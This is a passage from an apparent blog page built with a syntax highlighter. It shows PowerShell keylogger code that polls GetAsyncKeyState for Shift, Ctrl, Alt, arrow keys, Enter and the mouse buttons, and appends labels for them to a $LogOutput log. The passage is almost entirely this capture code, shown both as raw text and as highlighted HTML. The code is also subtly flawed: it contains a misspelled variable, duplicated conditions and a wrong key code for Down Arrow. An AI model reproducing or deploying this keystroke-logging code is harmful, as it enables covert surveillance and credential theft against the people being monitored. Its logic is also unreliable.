id="crayon-60a9b96a2c995025629918-16"><span class="crayon-sy">$</span><span class="crayon-v">LeftMouse</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">ImportDll</span><span class="crayon-o">::</span><span class="crayon-e">GetAsyncKeyState</span><span class="crayon-sy">(</span><span class="crayon-sy">[</span><span class="crayon-v">Windows</span><span class="crayon-sy">.</span><span class="crayon-v">Forms</span><span class="crayon-sy">.</span><span class="crayon-v">Keys</span><span class="crayon-sy">]</span><span class="crayon-o">::</span><span class="crayon-v">LButton</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">band</span><span class="crayon-h"> </span><span class="crayon-cn">0x8000</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">eq</span><span class="crayon-h"> </span><span class="crayon-cn">0x8000</span></div><div class="crayon-line" id="crayon-60a9b96a2c995025629918-17"><span class="crayon-sy">$</span><span class="crayon-v">RightMouse</span><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">ImportDll</span><span class="crayon-o">::</span><span class="crayon-e">GetAsyncKeyState</span><span class="crayon-sy">(</span><span class="crayon-sy">[</span><span class="crayon-v">Windows</span><span class="crayon-sy">.</span><span class="crayon-v">Forms</span><span class="crayon-sy">.</span><span class="crayon-v">Keys</span><span class="crayon-sy">]</span><span class="crayon-o">::</span><span class="crayon-v">RButton</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">band</span><span class="crayon-h"> </span><span class="crayon-cn">0x8000</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">eq</span><span class="crayon-h"> </span><span class="crayon-cn">0x8000</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c995025629918-18"><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-60a9b96a2c995025629918-19"><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">LeftShift</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-st">or</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">RightShift</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span><span class="crayon-sy">$</span><span class="crayon-v">LogOutput</span><span class="crayon-h"> </span><span class="crayon-o">+=</span><span class="crayon-h"> </span><span class="crayon-s">'[Shift]'</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c995025629918-20"><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">LeftCtrl</span><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-o">-</span><span class="crayon-st">or</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">RightCtrl</span><span class="crayon-sy">)</span><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-sy">{</span><span class="crayon-sy">$</span><span class="crayon-v">LogOutput</span><span class="crayon-h"> </span><span class="crayon-o">+=</span><span class="crayon-h"> </span><span class="crayon-s">'[Ctrl]'</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-60a9b96a2c995025629918-21"><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">LeftAlt</span><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-o">-</span><span class="crayon-st">or</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">RightAlt</span><span class="crayon-sy">)</span><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-sy">{</span><span class="crayon-sy">$</span><span class="crayon-v">LogOutput</span><span class="crayon-h"> </span><span class="crayon-o">+=</span><span class="crayon-h"> </span><span class="crayon-s">'[Alt]'</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c995025629918-22"><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">TabKey</span><span class="crayon-sy">)</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-sy">{</span><span class="crayon-sy">$</span><span class="crayon-v">LogOutput</span><span class="crayon-h"> </span><span class="crayon-o">+=</span><span class="crayon-h"> </span><span class="crayon-s">'[Tab]'</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-60a9b96a2c995025629918-23"><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">SpaceBar</span><span class="crayon-sy">)</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-sy">{</span><span class="crayon-sy">$</span><span class="crayon-v">LogOutput</span><span class="crayon-h"> </span><span class="crayon-o">+=</span><span class="crayon-h"> </span><span class="crayon-s">'[SpaceBar]'</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c995025629918-24"><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">DeleteKey</span><span class="crayon-sy">)</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span><span class="crayon-sy">$</span><span class="crayon-v">LogOutput</span><span class="crayon-h"> </span><span class="crayon-o">+=</span><span class="crayon-h"> </span><span class="crayon-s">'[Delete]'</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-60a9b96a2c995025629918-25"><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">EnterKey</span><span class="crayon-sy">)</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-sy">{</span><span class="crayon-sy">$</span><span class="crayon-v">LogOutput</span><span class="crayon-h"> </span><span class="crayon-o">+=</span><span class="crayon-h"> </span><span class="crayon-s">'[Enter]'</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c995025629918-26"><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">BackSpaceKey</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span><span class="crayon-sy">$</span><span class="crayon-v">LogOutput</span><span class="crayon-h"> </span><span class="crayon-o">+=</span><span class="crayon-h"> </span><span class="crayon-s">'[Backspace]'</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-60a9b96a2c995025629918-27"><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">LeftArrow</span><span class="crayon-sy">)</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span><span class="crayon-sy">$</span><span class="crayon-v">LogOutput</span><span class="crayon-h"> </span><span class="crayon-o">+=</span><span class="crayon-h"> </span><span class="crayon-s">'[Left Arrow]'</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c995025629918-28"><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">RightArrow</span><span class="crayon-sy">)</span><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-sy">{</span><span class="crayon-sy">$</span><span class="crayon-v">LogOutput</span><span class="crayon-h"> </span><span class="crayon-o">+=</span><span class="crayon-h"> </span><span class="crayon-s">'[Right Arrow]'</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-60a9b96a2c995025629918-29"><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">UpArrow</span><span class="crayon-sy">)</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span><span class="crayon-sy">$</span><span class="crayon-v">LogOutput</span><span class="crayon-h"> </span><span class="crayon-o">+=</span><span class="crayon-h"> </span><span class="crayon-s">'[Up Arrow]'</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c995025629918-30"><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">DownArrow</span><span class="crayon-sy">)</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span><span class="crayon-sy">$</span><span class="crayon-v">LogOutput</span><span class="crayon-h"> </span><span class="crayon-o">+=</span><span class="crayon-h"> </span><span class="crayon-s">'[Down Arrow]'</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-60a9b96a2c995025629918-31"><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">LeftMouse</span><span class="crayon-sy">)</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span><span class="crayon-sy">$</span><span class="crayon-v">LogOutput</span><span class="crayon-h"> </span><span class="crayon-o">+=</span><span class="crayon-h"> </span><span class="crayon-s">'[Left Mouse]'</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c995025629918-32"><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">RightMouse</span><span class="crayon-sy">)</span><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-sy">{</span><span class="crayon-sy">$</span><span class="crayon-v">LogOutput</span><span class="crayon-h"> </span><span class="crayon-o">+=</span><span class="crayon-h"> </span><span class="crayon-s">'[Right Mouse]'</span><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0042 seconds] -->
<p>Function DynAKey –</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a9b96a2c998748309379" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
$LeftShift = $ImportDll::GetAsyncKeyState(160)
$RightShift = $ImportDll::GetAsyncKeyState(161)
$LeftCtrl = $ImportDll::GetAsyncKeyState(162)
$RightCtrl = $ImportDll::GetAsyncKeyState(163)
$LeftAlt = $ImportDll::GetAsyncKeyState(164)
$RightAlt = $ImportDll::GetAsyncKeyState(165)
$TabKey = $ImportDll::GetAsyncKeyState(9)
$SpaceBar = $ImportDll::GetAsyncKeyState(32)
$DeleteKey = $ImportDll::GetAsyncKeyState(127)
$EnterKey = $ImportDll::GetAsyncKeyState(13)
$BackSpaceKey = $ImportDll::GetAsyncKeyState(8)
$LeftArrow = $ImportDll::GetAsyncKeyState(37)
$RightArrow = $ImportDll::GetAsyncKeyState(39)
$UpArrow = $ImportDll::GetAsyncKeyState(38)
$DownArrow = $ImportDll::GetAsyncKeyState(34)
$LeftMouse = $ImportDll::GetAsyncKeyState(1)
$RightMouse = $ImportDll::GetAsyncKeyState(2)

if ((($LeftShift -eq -32767) -or ($RightShift -eq -32767)) -or (($LeftShift -eq -32768) -or ($RightShfit -eq -32768))) {$LogOutput += '[Shift] '}
if ((($LeftCtrl -eq -32767) -or ($LeftCtrl -eq -32767)) -or (($RightCtrl -eq -32768) -or ($RightCtrl -eq -32768))) {$LogOutput += '[Ctrl] '}
if ((($LeftAlt -eq -32767) -or ($LeftAlt -eq -32767)) -or (($RightAlt -eq -32767) -or ($RightAlt -eq -32767))) {$LogOutput += '[Alt] '}
if (($TabKey -eq -32767) -or ($TabKey -eq -32768)) {$LogOutput += '[Tab] '}
if (($SpaceBar -eq -32767) -or ($SpaceBar -eq -32768)) {$LogOutput += '[SpaceBar] '}
if (($DeleteKey -eq -32767) -or ($DeleteKey -eq -32768)) {$LogOutput += '[Delete] '}
if (($EnterKey -eq -32767) -or ($EnterKey -eq -32768)) {$LogOutput += '[Enter] '}
if (($BackSpaceKey -eq -32767) -or ($BackSpaceKey -eq -32768)) {$LogOutput += '[Backspace] '}
if (($LeftArrow -eq -32767) -or ($LeftArrow -eq -32768)) {$LogOutput += '[Left Arrow] '}
if (($RightArrow -eq -32767) -or ($RightArrow -eq -32768)) {$LogOutput += '[Right Arrow] '}
if (($UpArrow -eq -32767) -or ($UpArrow -eq -32768)) {$LogOutput += '[Up Arrow] '}
if (($DownArrow -eq -32767) -or ($DownArrow -eq -32768)) {$LogOutput += '[Down Arrow] '}
if (($LeftMouse -eq -32767) -or ($LeftMouse -eq -32768)) {$LogOutput += '[Left Mouse] '}
if (($RightMouse -eq -32767) -or ($RightMouse -eq -32768)) {$LogOutput += '[Right Mouse] '}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a9b96a2c998748309379-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c998748309379-2">2</div><div class="crayon-num" data-line="crayon-60a9b96a2c998748309379-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c998748309379-4">4</div><div class="crayon-num" data-line="crayon-60a9b96a2c998748309379-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c998748309379-6">6</div><div class="crayon-num" data-line="crayon-60a9b96a2c998748309379-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c998748309379-8">8</div><div class="crayon-num" data-line="crayon-60a9b96a2c998748309379-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c998748309379-10">10</div><div class="crayon-num" data-line="crayon-60a9b96a2c998748309379-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c998748309379-12">12</div><div class="crayon-num" data-line="crayon-60a9b96a2c998748309379-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c998748309379-14">14</div><div class="crayon-num" data-line="crayon-60a9b96a2c998748309379-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c998748309379-16">16</div><div class="crayon-num" data-line="crayon-60a9b96a2c998748309379-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c998748309379-18">18</div><div class="crayon-num" data-line="crayon-60a9b96a2c998748309379-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c998748309379-20">20</div><div class="crayon-num" data-line="crayon-60a9b96a2c998748309379-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c998748309379-22">22</div><div class="crayon-num" data-line="crayon-60a9b96a2c998748309379-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c998748309379-24">24</div><div class="crayon-num" data-line="crayon-60a9b96a2c998748309379-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c998748309379-26">26</div><div class="crayon-num" data-line="crayon-60a9b96a2c998748309379-27">27</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c998748309379-28">28</div><div class="crayon-num" data-line="crayon-60a9b96a2c998748309379-29">29</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c998748309379-30">30</div><div class="crayon-num" data-line="crayon-60a9b96a2c998748309379-31">31</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c998748309379-32">32</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a9b96a2c998748309379-1"><span class="crayon-sy">$</span><span class="crayon-v">LeftShift</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">ImportDll</span><span class="crayon-o">::</span><span class="crayon-e">GetAsyncKeyState</span><span class="crayon-sy">(</span><span class="crayon-cn">160</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c998748309379-2"><span class="crayon-sy">$</span><span class="crayon-v">RightShift</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">ImportDll</span><span class="crayon-o">::</span><span class="crayon-e">GetAsyncKeyState</span><span class="crayon-sy">(</span><span class="crayon-cn">161</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-60a9b96a2c998748309379-3"><span class="crayon-sy">$</span><span class="crayon-v">LeftCtrl</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">ImportDll</span><span class="crayon-o">::</span><span class="crayon-e">GetAsyncKeyState</span><span class="crayon-sy">(</span><span class="crayon-cn">162</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c998748309379-4"><span class="crayon-sy">$</span><span class="crayon-v">RightCtrl</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">ImportDll</span><span class="crayon-o">::</span><span class="crayon-e">GetAsyncKeyState</span><span class="crayon-sy">(</span><span class="crayon-cn">163</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-60a9b96a2c998748309379-5"><span class="crayon-sy">$</span><span class="crayon-v">LeftAlt</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">ImportDll</span><span class="crayon-o">::</span><span class="crayon-e">GetAsyncKeyState</span><span class="crayon-sy">(</span><span class="crayon-cn">164</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c998748309379-6"><span class="crayon-sy">$</span><span class="crayon-v">RightAlt</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">ImportDll</span><span class="crayon-o">::</span><span class="crayon-e">GetAsyncKeyState</span><span class="crayon-sy">(</span><span class="crayon-cn">165</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-60a9b96a2c998748309379-7"><span class="crayon-sy">$</span><span class="crayon-v">TabKey</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">ImportDll</span><span class="crayon-o">::</span><span class="crayon-e">GetAsyncKeyState</span><span class="crayon-sy">(</span><span class="crayon-cn">9</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c998748309379-8"><span class="crayon-sy">$</span><span class="crayon-v">SpaceBar</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">ImportDll</span><span class="crayon-o">::</span><span class="crayon-e">GetAsyncKeyState</span><span class="crayon-sy">(</span><span class="crayon-cn">32</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-60a9b96a2c998748309379-9"><span class="crayon-sy">$</span><span class="crayon-v">DeleteKey</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">ImportDll</span><span class="crayon-o">::</span><span class="crayon-e">GetAsyncKeyState</span><span class="crayon-sy">(</span><span class="crayon-cn">127</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c998748309379-10"><span class="crayon-sy">$</span><span class="crayon-v">EnterKey</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">ImportDll</span><span class="crayon-o">::</span><span class="crayon-e">GetAsyncKeyState</span><span class="crayon-sy">(</span><span class="crayon-cn">13</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-60a9b96a2c998748309379-11"><span class="crayon-sy">$</span><span class="crayon-v">BackSpaceKey</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">ImportDll</span><span class="crayon-o">::</span><span class="crayon-e">GetAsyncKeyState</span><span class="crayon-sy">(</span><span class="crayon-cn">8</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c998748309379-12"><span class="crayon-sy">$</span><span class="crayon-v">LeftArrow</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">ImportDll</span><span class="crayon-o">::</span><span class="crayon-e">GetAsyncKeyState</span><span class="crayon-sy">(</span><span class="crayon-cn">37</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-60a9b96a2c998748309379-13"><span class="crayon-sy">$</span><span class="crayon-v">RightArrow</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">ImportDll</span><span class="crayon-o">::</span><span class="crayon-e">GetAsyncKeyState</span><span class="crayon-sy">(</span><span class="crayon-cn">39</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c998748309379-14"><span class="crayon-sy">$</span><span class="crayon-v">UpArrow</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">ImportDll</span><span class="crayon-o">::</span><span class="crayon-e">GetAsyncKeyState</span><span class="crayon-sy">(</span><span class="crayon-cn">38</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-60a9b96a2c998748309379-15"><span class="crayon-sy">$</span><span class="crayon-v">DownArrow</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">ImportDll</span><span class="crayon-o">::</span><span class="crayon-e">GetAsyncKeyState</span><span class="crayon-sy">(</span><span class="crayon-cn">34</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c998748309379-16"><span class="crayon-sy">$</span><span class="crayon-v">LeftMouse</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">ImportDll</span><span class="crayon-o">::</span><span class="crayon-e">GetAsyncKeyState</span><span class="crayon-sy">(</span><span class="crayon-cn">1</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-60a9b96a2c998748309379-17"><span class="crayon-sy">$</span><span class="crayon-v">RightMouse</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">ImportDll</span><span class="crayon-o">::</span><span class="crayon-e">GetAsyncKeyState</span><span class="crayon-sy">(</span><span class="crayon-cn">2</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c998748309379-18">&nbsp;</div><div class="crayon-line" id="crayon-60a9b96a2c998748309379-19"><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">LeftShift</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">eq</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-cn">32767</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-st">or</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">RightShift</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">eq</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-cn">32767</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-st">or</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">LeftShift</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">eq</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-cn">32768</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-st">or</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">RightShfit</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">eq</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-cn">32768</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span><span class="crayon-sy">$</span><span class="crayon-v">LogOutput</span><span class="crayon-h"> </span><span class="crayon-o">+=</span><span class="crayon-h"> </span><span class="crayon-s">'[Shift] '</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c998748309379-20"><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">LeftCtrl</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">eq</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-cn">32767</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-st">or</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">LeftCtrl</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">eq</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-cn">32767</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-st">or</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">RightCtrl</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">eq</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-cn">32768</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-st">or</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">RightCtrl</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">eq</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-cn">32768</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span><span class="crayon-sy">$</span><span class="crayon-v">LogOutput</span><span class="crayon-h"> </span><span class="crayon-o">+=</span><span class="crayon-h"> </span><span class="crayon-s">'[Ctrl] '</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-60a9b96a2c998748309379-21"><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">LeftAlt</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">eq</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-cn">32767</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-st">or</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">LeftAlt</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">eq</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-cn">32767</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-st">or</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">RightAlt</span><span class="crayon-h"> 